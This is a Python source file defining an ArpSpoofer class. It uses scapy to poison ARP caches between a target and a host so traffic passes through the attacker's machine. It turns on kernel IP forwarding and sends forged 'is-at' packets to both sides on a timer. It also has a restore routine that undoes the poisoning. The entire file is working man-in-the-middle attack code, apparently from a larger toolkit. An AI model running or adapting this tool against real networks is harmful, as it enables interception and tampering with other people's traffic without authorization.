'''
Arp spoofing module. Stateless functions that can be used whenever + Stateful class that manages persistent/async things
'''
import scapy.all as scapy
from scapy.all import Packet, ARP
import threading
from ..data_buffer import DataBuffer
import ipaddress, netifaces
# TODO get mac address better

class ArpSpoofer:

    def __init__(self, buffer: DataBuffer, interval=1.0):
        self.buffer = buffer
        self.interval = interval

        self.running = False
        self.timer = None


    # Setup methods

    def tick(self):
        if not self.running:
            return

        # Tell the target we are host
        if self.target_mac is None:
            self.buffer.put("arp", f"Could not find MAC address for target IP {self.target_ip}. Searching again...")
            self.target_mac = self.get_mac(self.target_ip)
        else:
            self.spoof(self.target_ip, self.target_mac, self.host_ip)
        
        # Tell the host we are target
        if self.host_mac is None:
            self.buffer.put("arp", f"Could not find MAC address for host IP {self.host_ip}. Searching again...")
            self.host_mac = self.get_mac(self.host_ip)
        else:
            self.spoof(self.host_ip, self.host_mac, self.target_ip)

        self.timer = threading.Timer(self.interval, self.tick)
        self.timer.start()


    def start(self, target_ip, host_ip):

        # enable forwarding
        with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
            f.write('1\n')

        # target_ip='192.168.8.137', host_ip='192.168.8.243'
        scapy.conf.verb = 0

        if self.running:
            self.buffer.put("arp", "ARP Spoof is already running")
            return

        self.buffer.put("arp", "Starting ARP Spoof")

        self.target_ip = target_ip
        self.host_ip = host_ip

        self.target_mac = self.get_mac(target_ip)
        self.host_mac = self.get_mac(host_ip)
        
        self.running = True

        self.tick()


    def stop(self):
        # disable forwarding
        with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
            f.write('0\n')

        if self.running == False:
            self.buffer.put("arp", "ARP Spoof is not running")
            return

        self.buffer.put("arp", "Stopping ARP Spoof")

        self.running = False

        if self.timer:
            self.timer.cancel()

        self.restore(self.target_ip, self.host_ip)
        self.restore(self.host_ip, self.target_ip)
        self.buffer.put("arp", "Stopped ARP Spoof.")


    # Useful methods
    
    def get_mac(self, ip: str):
        arp_request = scapy.ARP(pdst=ip)
        broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
        packet = broadcast / arp_request
        self.buffer.put("arp", "MAC address request", packet)

        answered, _ = scapy.srp(packet, timeout=2, verbose=False)

        if answered:
            self.buffer.put("arp", "MAC address response", answered[0][1])
            return answered[0][1].hwsrc


    def spoof(self, target_ip: str, target_mac: str, spoof_ip: str):
        packet = scapy.Ether(dst=target_mac) / scapy.ARP(
        op='is-at',
        pdst=target_ip,
        hwdst=target_mac,
        psrc=spoof_ip
        )

        scapy.sendp(packet, verbose=False)
        self.buffer.put("arp", "Spoofing packet", packet)


    def restore(self, destination_ip, source_ip):
        destination_mac = self.get_mac(destination_ip)
        source_mac = self.get_mac(source_ip)

        if destination_mac is None or source_mac is None:
            self.buffer.put("arp", f"Could not find MAC address for {destination_ip} or {source_ip}. Cannot send restore packet.")
            return

        packet = scapy.Ether(dst=destination_mac) / scapy.ARP(
            op=2,
            pdst=destination_ip,
            hwdst=destination_mac,
            psrc=source_ip,
            hwsrc=source_mac
        )

        self.buffer.put("arp", "Restore packet", packet)
        scapy.sendp(packet, verbose=False)